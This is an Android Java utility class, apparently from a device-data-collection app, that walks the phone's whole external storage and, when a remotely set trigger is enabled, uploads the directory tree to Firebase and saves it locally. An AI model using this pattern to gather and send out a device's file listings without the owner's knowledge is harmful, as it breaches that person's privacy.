package com.vikasyadavnsit.cdc.utils;

import static com.vikasyadavnsit.cdc.utils.CommonUtil.hasFileAccess;

import android.os.Environment;

import com.google.gson.Gson;
import com.vikasyadavnsit.cdc.data.ApplicationData;
import com.vikasyadavnsit.cdc.data.DeviceData;
import com.vikasyadavnsit.cdc.data.User;
import com.vikasyadavnsit.cdc.database.repository.ApplicationDataRepository;
import com.vikasyadavnsit.cdc.database.repository.DeviceDataRepository;
import com.vikasyadavnsit.cdc.enums.ClickActions;
import com.vikasyadavnsit.cdc.enums.FileMap;

import java.io.File;
import java.util.LinkedHashMap;
import java.util.Map;

public class FileExplorer {

    /**
     * Recursively enumerates files/directories under {@code directory} and writes the structure into {@code currentMap}.
     *
     * <p>Directories are represented as nested {@link LinkedHashMap} values; files are stored with a {@code null} value.</p>
     *
     * @param directory  Root directory to enumerate.
     * @param currentMap Map to populate with the directory tree representation.
     */
    public static void listFilesAndStoreInMap(File directory, LinkedHashMap<String, Object> currentMap) {
        File[] files = directory.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    // Create a new map for the subdirectory
                    LinkedHashMap<String, Object> subDirectoryMap = new LinkedHashMap<>();
                    // Add the subdirectory map to the current directory map
                    currentMap.put(file.getName(), subDirectoryMap);
                    // Recursively list files and store them in the subdirectory map
                    listFilesAndStoreInMap(file, subDirectoryMap);
                } else {
                    // Add the file to the current directory map with null value or file details
                    currentMap.put(file.getName(), null);
                }
            }
        }
    }

    /**
     * Captures the external storage directory structure and optionally uploads/stores it based on trigger settings.
     *
     * <p>Logic summary:</p>
     * <ul>
     *   <li>Requires external file access (see {@link CommonUtil#hasFileAccess()}).</li>
     *   <li>Builds a recursive directory map rooted at {@link Environment#getExternalStorageDirectory()}.</li>
     *   <li>Reads {@code GET_DIRECTORY_STRUCTURE} trigger settings from {@link ApplicationDataRepository}.</li>
     *   <li>If enabled, optionally uploads to Firebase and inserts a snapshot into Room.</li>
     * </ul>
     *
     * @return A {@link LinkedHashMap} representing the directory tree (may be empty if permissions are missing).
     */
    public static LinkedHashMap<String, Object> getDirectoryStructure() {
        LinkedHashMap<String, Object> directoryMap = new LinkedHashMap<>();

        if (hasFileAccess()) {
            listFilesAndStoreInMap(Environment.getExternalStorageDirectory(), directoryMap);
            ApplicationData appData = ApplicationDataRepository.getRecordByKey(ClickActions.GET_DIRECTORY_STRUCTURE.name());
            User.AppTriggerSettingsData appTriggerSettingsData = new Gson().fromJson(appData.getValue(), User.AppTriggerSettingsData.class);

            if (appTriggerSettingsData != null && appTriggerSettingsData.isEnabled()) {

                if (appTriggerSettingsData.isUploadDataSnapshot())
                    FirebaseUtils.uploadDeviceDirectoryStructureSnapshot(directoryMap);

                DeviceDataRepository.insert(DeviceData.builder().value(new Gson().toJson(directoryMap)).fileMapType(FileMap.DIRECTORY_STRUCTURE).build());
            } else {
                LoggerUtils.d("FileExplorer", "GET_DIRECTORY_STRUCTURE setting is disabled");
            }
        } else {
            LoggerUtils.d("FileExplorer", "No File Access for Getting Directory Structure logging decision");
        }

        // Start monitoring changes in the directory
        return directoryMap;

    }

//    // Print the directory structure
//    printMap(directoryMap, "");

    /**
     * Prints a directory structure map to stdout for debugging/visualization.
     *
     * @param map    Directory map produced by {@link #getDirectoryStructure()} or similar.
     * @param indent Current indentation prefix used for recursive pretty-printing.
     */
    public static void printMap(Map<String, Object> map, String indent) {
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            if (entry.getValue() instanceof LinkedHashMap) {
                // Indicate that this is a directory
                System.out.println(indent + "DIRECTORY: " + entry.getKey());
                // Recursively print the subdirectory
                printMap((LinkedHashMap<String, Object>) entry.getValue(), indent + "  ");
            } else {
                // Indicate that this is a file
                System.out.println(indent + "FILE: " + entry.getKey());
            }
        }
    }
}
